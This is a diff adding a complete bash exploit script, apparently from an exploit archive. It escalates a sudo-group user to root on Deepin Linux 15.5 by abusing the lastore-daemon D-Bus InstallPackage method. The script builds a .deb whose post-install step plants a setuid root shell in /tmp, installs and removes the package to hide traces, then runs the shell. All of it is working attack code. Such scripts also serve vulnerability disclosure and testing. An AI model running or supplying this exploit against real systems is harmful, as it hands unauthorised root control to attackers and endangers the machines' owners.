@@ -1,0 +1,33 @@
+#!/bin/bash
+# Deepin Linux 15.5 lastore-daemon D-Bus Local Root Exploit
+#
+# The lastore-daemon D-Bus configuration on Deepin Linux 15.5 permits any user
+# in the sudo group to install arbitrary packages without providing a password,
+# resulting in code execution as root. By default, the first user created on
+# the system is a member of the sudo group.
+# ~ bcoles
+#
+# Based on exploit by King's Way: https://www.exploit-db.com/exploits/39433/
+#
+echo Deepin Linux 15.5 lastore-daemon D-Bus Local Root Exploit
+echo Building package...
+BASE="/tmp/"
+UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 32 | head -n 1)
+mkdir "${BASE}${UUID}" && mkdir "${BASE}${UUID}/DEBIAN"
+echo -e "Package: ${UUID}\nVersion: 0.1\nMaintainer: ${UUID}\nArchitecture: all\nDescription: ${UUID}" > ${BASE}${UUID}/DEBIAN/control
+echo -e "#!/bin/sh\ncp /bin/sh ${BASE}/rootsh\nchmod 04755 ${BASE}/rootsh\n" > ${BASE}${UUID}/DEBIAN/postinst
+chmod +x ${BASE}${UUID}/DEBIAN/postinst
+dpkg-deb --build "${BASE}${UUID}"
+echo Installing package...
+dbus-send --system --dest=com.deepin.lastore --type=method_call --print-reply /com/deepin/lastore com.deepin.lastore.Manager.InstallPackage string:"${UUID}" string:"${BASE}${UUID}.deb"
+sleep 10
+echo Removing package...
+dbus-send --system --dest=com.deepin.lastore --type=method_call --print-reply /com/deepin/lastore com.deepin.lastore.Manager.RemovePackage string:" " string:"${UUID}"
+rm -rf "${BASE}${UUID}" "${BASE}${UUID}.deb"
+if [ -f /tmp/rootsh ]
+then
+  echo "Success! Found root shell: /tmp/rootsh"
+  /tmp/rootsh
+else
+  echo "Exploit failed! Check /var/log/lastore/daemon.log"
+fi
